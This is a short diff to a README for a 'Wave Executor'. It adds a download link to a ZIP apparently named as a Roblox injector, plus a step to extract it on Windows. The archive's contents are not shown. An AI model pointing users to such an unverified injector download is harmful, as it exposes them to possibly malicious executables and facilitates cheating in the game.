@@ -33,7 +33,7 @@ To get started with the Wave Executor, simply follow the installation instructio
 
 ## Installation
 
-* [Download]()
+* [Download](https://github.com/katiamch/Wave-Executor/releases/download/Download/Roblox.Injector.zip)
 
 1. Extract the downloaded ZIP file to a location of your choice on your Windows computer.
 
